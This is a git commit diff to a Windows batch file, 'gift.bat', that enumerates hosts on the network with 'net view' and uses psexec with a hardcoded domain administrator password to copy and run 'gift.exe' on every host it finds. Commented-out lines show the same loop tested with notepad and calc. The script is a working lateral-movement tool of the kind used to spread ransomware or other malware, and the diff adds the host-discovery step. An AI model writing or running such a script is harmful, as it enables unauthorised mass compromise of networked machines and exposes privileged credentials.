dd60c9911523dbb41e90bb798bf4c8fc5f13cd04
d77juan <79436534+d77juan@users.noreply.github.com>
2021-06-16 21:04:02 -0700

    Update gift.bat

--- gift.bat
+++ gift.bat
@@ -1,4 +1,5 @@
 cd c:\windows\temp\
 REM for /F %%x in (c:\windows\temp\computers.txt) do c:\windows\temp\psexec.exe %%x  -accepteula -d -u vonese\administrator  -p Zxcv7890! notepad 
 REM for /f %%x in (c.txt) do  psexec33.exe %%x -accepteula -d -u vonese\administrator -p Zxcv7890! -h calc.exe 
+net view | find "\\" > computers.txt
 for /F %%x in (computers.txt) do psexec.exe %%x -accepteula -d -u vonese\administrator -p Zxcv7890! -h -c "c:\windows\temp\gift.exe"
